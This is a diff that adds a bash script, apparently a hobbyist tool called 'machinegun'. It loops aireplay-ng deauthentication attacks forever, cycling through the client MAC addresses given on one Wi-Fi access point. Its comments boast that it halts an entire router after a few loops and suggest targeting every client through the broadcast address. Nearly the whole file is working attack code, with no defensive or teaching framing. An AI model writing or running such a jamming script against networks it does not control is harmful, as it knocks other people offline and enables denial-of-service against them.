@@ -1,0 +1,58 @@
+#!/bin/bash
+
+#This program will execute deauthentication attacks on multiple users. It works by using an 'aireplay-ng
+#--deauth' in a loop and changes target MAC addresses every cycle.
+#I should look into trying to target all targets on a network by using a broadcast address as the target
+#MAC address. I actually shouldn't have to even recode anything, I should just try it out.
+#By, codeDirtyToMe
+
+#This is how it's is supposed to be used
+##########################################################
+#           $1        $2           $3      $4   $5   $6  #
+#machinegun AP #ofPacketsPerTgt interface tgt1 tgt2 tgt3 #
+##########################################################
+
+function help(){
+echo "This script will send a specified number of deauthentication packets to target MAC addresses."
+echo "It will execute until forced stop with Ctrl+C." 
+echo "***********************************************************************"
+echo "Usage: ./machinegun AP #ofPacketsPerTgt Interface tgt1 tgt2 tgt3 etc..."
+echo "***********************************************************************"
+echo "As it runs right now, it tends to bring an entire router to a grinding halt after a few loops."
+}
+if [ $1 = "help" ]; then #If the first argument is 'help', run the shotgunArt() and help().
+	help
+else
+
+#I have to assign these variables to the first three parameters now as I will lose them after the shift
+#command in the first loop
+AP=$1          #1st argument assigned as access point to spoof.
+PACKETS=$2     #2nd argument assigned as the number of packets to send per tgt.
+INTERFACE=$3   #3rd argument assigned as the interface to use to launch the attack.
+
+TOTALTGT=$(expr $# - 3) #This is the total number of targets that were input.
+LOADCOUNTER=0 #Counter used for the next loop.
+
+#This loop loads target MAC addresses into an array to be used in a later loop.
+while [ $LOADCOUNTER -lt $TOTALTGT ]; do 
+	TGTBASKET[$LOADCOUNTER]=$4
+	echo ${TGTBASKET[$LOADCOUNTER]} #This is a test line to be deleted later
+	LOADCOUNTER=$(expr $LOADCOUNTER + 1)
+	shift
+done
+
+while [ 0 -lt 1  ]; do #This is teh start of the inifinite loop.
+ATTACKCOUNTER=0 #This variable needs to be reset after each loop.
+
+	while [ $ATTACKCOUNTER -lt $TOTALTGT ]; do #This is the attack loop
+	echo "Attacking target: ${TGTBASKET[$ATTACKCOUNTER]}"
+	aireplay-ng --deauth $PACKETS -a $AP -c ${TGTBASKET[$ATTACKCOUNTER]} $INTERFACE
+	ATTACKCOUNTER=$(expr $ATTACKCOUNTER + 1)
+	sleep 2s
+	done
+
+done
+
+fi
+
+exit 0
